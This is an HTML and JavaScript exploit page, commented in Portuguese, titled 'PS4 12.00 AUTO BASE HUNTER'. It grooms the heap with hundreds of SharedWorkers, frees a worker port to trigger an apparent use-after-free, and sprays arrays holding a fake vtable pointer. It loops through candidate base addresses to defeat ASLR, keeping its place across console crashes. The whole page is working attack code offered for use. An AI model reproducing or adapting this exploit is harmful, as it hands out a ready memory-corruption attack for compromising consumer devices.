<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 AUTO BASE HUNTER</title>
    
</head>
<body>

    <h1>PS4 12.00 - AUTO BASE HUNTER</h1>
    <h3>VTable Offset: 0x3837CC8 | Target: 0xA0</h3>
    <h2 id="status_text">Inicializando...</h2>
    
    <button id="btn_action" onclick="start_sequence()">INICIAR BUSCA</button>
    <button onclick="reset_progress()" style="background:#550000; border-color:red;">RESETAR</button>

    <div id="log"></div>

    <script>
        function log(msg, color="#ccc") {
            var d = document.getElementById("log");
            d.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            d.scrollTop = d.scrollHeight;
        }

        // =================================================================
        // 1. CONFIGURAÇÃO E DADOS REAIS
        // =================================================================
        const VTABLE_OFFSET = 0x3837CC8n; // Offset fixo do arquivo ELF
        const TARGET_SIZE   = 0xA0;       // Tamanho fixo do SharedWorker

        // Lista de Bases para testar (ASLR do FreeBSD/PS4 não é infinito)
        const BASES = [
            0x800000000n, 0x820000000n, 0x801000000n, 
            0x804000000n, 0x808000000n, 0x880000000n,
            0x900000000n, 0x920000000n, 0x200000000n,
            0x800004000n, 0x820004000n
        ];

        var current_idx = 0;

        // =================================================================
        // 2. LÓGICA DE PERSISTÊNCIA (Para sobreviver ao Crash)
        // =================================================================
        function init() {
            var saved = localStorage.getItem("base_idx");
            if(saved) current_idx = parseInt(saved);
            
            if (current_idx >= BASES.length) {
                document.getElementById("status_text").innerText = "TODAS AS BASES FALHARAM.";
                log("Ciclo completo. Tente reiniciar o console e limpar dados.", "red");
                return;
            }

            var current_base = BASES[current_idx];
            document.getElementById("status_text").innerText = `Base Atual: 0x${current_base.toString(16)}`;
            log(`Preparado para testar Base #${current_idx + 1}: 0x${current_base.toString(16)}`);
            
            // Auto-run opcional (Descomente para loop automático após crash)
            // setTimeout(start_sequence, 2000);
        }

        function reset_progress() {
            localStorage.setItem("base_idx", 0);
            location.reload();
        }

        function save_next() {
            localStorage.setItem("base_idx", current_idx + 1);
        }

        // =================================================================
        // 3. PAYLOAD: FAKE OBJECT COM VTABLE CALCULADA
        // =================================================================
        function build_payload(base_addr) {
            // Calcula o endereço real da VTable na memória
            // Se a Base estiver certa, VTable = Base + Offset
            var vtable_real = base_addr + VTABLE_OFFSET;
            
            // Double Array Spray (Butterfly)
            // Tamanho 0xA0 (160) - 16 (Header) = 144 bytes dados
            // 144 / 8 = 18 elementos
            var arr = new Array(18);
            
            // Converte o endereço (BigInt) para Float
            var buf = new ArrayBuffer(8);
            var view = new DataView(buf);
            view.setBigUint64(0, vtable_real, true);
            var vtable_float = view.getFloat64(0, true);

            // Enche o objeto com esse ponteiro válido
            for(let i=0; i<arr.length; i++) {
                arr[i] = vtable_float;
            }
            return arr;
        }

        // =================================================================
        // 4. EXECUÇÃO
        // =================================================================
        var workers = [];

        async function start_sequence() {
            if(!window.SharedWorker) return log("Navegador incompatível.");
            
            // Salva o próximo índice ANTES de rodar.
            // Se der crash, quando voltar, já tenta o próximo.
            save_next();
            
            var base = BASES[current_idx];
            var payload = build_payload(base);
            
            log(`Construindo Fake Object com VTable: 0x${(base + VTABLE_OFFSET).toString(16)}`);

            // Grooming (380)
            for(let i=0; i<380; i++) {
                try { workers.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
            }

            // Trigger (403)
            var p_count = 0;
            var limit = 403 - 380;
            
            var it = setInterval(() => {
                if (p_count >= limit) {
                    clearInterval(it);
                    
                    log("!!! DISPARANDO NO WORKER 403 !!!", "orange");
                    
                    var v = workers.pop();
                    var p = v.port;
                    
                    // FREE
                    v.port.close();
                    
                    // SPRAY
                    var spray = [];
                    for(let k=0; k<25000; k++) {
                        spray.push(payload.slice(0)); // Clone rápido
                    }

                    // CHECK DE VIDA
                    setTimeout(() => {
                        try {
                            // Se a base estiver CERTA: O objeto é válido. .toString() funciona.
                            // Se a base estiver ERRADA: Ponteiro inválido. Crash/Panic.
                            
                            var s = p.toString();
                            
                            // Se chegamos aqui, o console NÃO desligou!
                            log("!!! SUCESSO: CONSOLE SOBREVIVEU !!!", "#00ff00");
                            log(`A Base correta é: 0x${base.toString(16)}`, "#00ff00");
                            
                            // REVERTER SALVAMENTO (Achamos a certa!)
                            localStorage.setItem("base_idx", current_idx); 
                            alert(`BASE ENCONTRADA: 0x${base.toString(16)}\nUse este valor no config.js!`);
                            
                        } catch(e) {
                            log("Erro JS (Isso é bom, não crashou o kernel): " + e);
                        }
                        
                        // Se não crashou, mas também não funcionou, tenta limpar
                        workers.forEach(w=>{try{w.port.close()}catch(e){}});
                    }, 500);
                    
                    return;
                }
                
                try {
                    let w = new SharedWorker("data:text,1", "v"+p_count);
                    w.port.start();
                    workers.push(w);
                } catch(e){}
                p_count++;
            }, 60);
        }

        // Iniciar UI
        init();
    </script>
</body>
</html>
